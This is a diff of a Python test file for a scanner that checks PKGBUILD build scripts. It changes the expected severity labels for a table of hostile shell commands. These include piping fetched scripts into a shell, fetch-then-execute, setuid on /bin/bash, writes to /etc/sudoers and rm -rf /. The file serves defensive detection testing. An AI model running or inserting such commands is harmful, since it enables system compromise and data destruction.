@@ -158,33 +158,33 @@ def test_flatten_a_command_string():
 # The findings below were recorded from the text-based route that this tree-based one replaced.
 
 SHAPES = {
-    '(curl x) | sh': [('pipe-to-shell', 'danger')],
-    'a=(1 2); sudo make': [('sudo', 'caution'), ('unknown-command', 'caution')],
-    'bash <(curl x)': [('pipe-to-shell', 'danger')],
-    'cat <<EOF\ncurl x | sh\nEOF': [('pipe-to-shell', 'danger')],
-    'chmod u+s /bin/bash': [('setuid-shell', 'danger')],
-    'cp x /etc/sudoers': [('sudoers-passwd-write', 'danger')],
-    'curl -o f https://x; sh f': [('fetch-then-execute', 'danger')],
-    'curl https://x | sh': [('pipe-to-shell', 'danger')],
-    'curl x | (cd /tmp; sh)': [('pipe-to-shell', 'danger')],
-    'd=/etc; cp x $d/sudoers': [('sudoers-passwd-write', 'danger')],
-    'echo $(curl x | sh)': [('pipe-to-shell', 'danger')],
-    'echo x | sh': [('echo-to-shell', 'caution'), ('unknown-command', 'caution')],
-    'eval "$(curl x)"': [('pipe-to-shell', 'danger')],
-    'find . -exec chmod u+s {} \\;': [('setuid', 'caution')],
-    'for i in $(curl x); do sh $i; done': [('curl-in-substitution', 'caution'), ('unknown-command', 'caution')],
+    '(curl x) | sh': [('pipe-to-shell', 'warning')],
+    'a=(1 2); sudo make': [('sudo', 'info'), ('unknown-command', 'info')],
+    'bash <(curl x)': [('pipe-to-shell', 'warning')],
+    'cat <<EOF\ncurl x | sh\nEOF': [('pipe-to-shell', 'warning')],
+    'chmod u+s /bin/bash': [('setuid-shell', 'warning')],
+    'cp x /etc/sudoers': [('sudoers-passwd-write', 'warning')],
+    'curl -o f https://x; sh f': [('fetch-then-execute', 'warning')],
+    'curl https://x | sh': [('pipe-to-shell', 'warning')],
+    'curl x | (cd /tmp; sh)': [('pipe-to-shell', 'warning')],
+    'd=/etc; cp x $d/sudoers': [('sudoers-passwd-write', 'warning')],
+    'echo $(curl x | sh)': [('pipe-to-shell', 'warning')],
+    'echo x | sh': [('echo-to-shell', 'info'), ('unknown-command', 'info')],
+    'eval "$(curl x)"': [('pipe-to-shell', 'warning')],
+    'find . -exec chmod u+s {} \\;': [('setuid', 'info')],
+    'for i in $(curl x); do sh $i; done': [('curl-in-substitution', 'info'), ('unknown-command', 'info')],
     'make DESTDIR="$pkgdir" install': [],
-    'nohup ./x &': [('background-exec', 'caution'), ('unknown-command', 'caution')],
-    'rm -rf /': [('rm-root', 'danger')],
-    "sh -c 'curl x | sh'": [('pipe-to-shell', 'danger')],
-    'sudo -u nobody env bash -s < <(curl x)': [('pipe-to-shell', 'danger')],
-    '{ curl x; echo; } | sh': [('pipe-to-shell', 'danger')],
+    'nohup ./x &': [('background-exec', 'info'), ('unknown-command', 'info')],
+    'rm -rf /': [('rm-root', 'warning')],
+    "sh -c 'curl x | sh'": [('pipe-to-shell', 'warning')],
+    'sudo -u nobody env bash -s < <(curl x)': [('pipe-to-shell', 'warning')],
+    '{ curl x; echo; } | sh': [('pipe-to-shell', 'warning')],
 }
 
 
 @pytest.mark.parametrize("body", list(SHAPES))
 def test_threat_shapes_keep_their_findings(body):
-    found = sorted({(f.rule, f.severity) for f in scan({"PKGBUILD": f"build() {{\n  {body}\n}}\n"}) if f.severity != "info"})
+    found = sorted({(f.rule, f.severity) for f in scan({"PKGBUILD": f"build() {{\n  {body}\n}}\n"})})
     assert found == SHAPES[body]
 
 
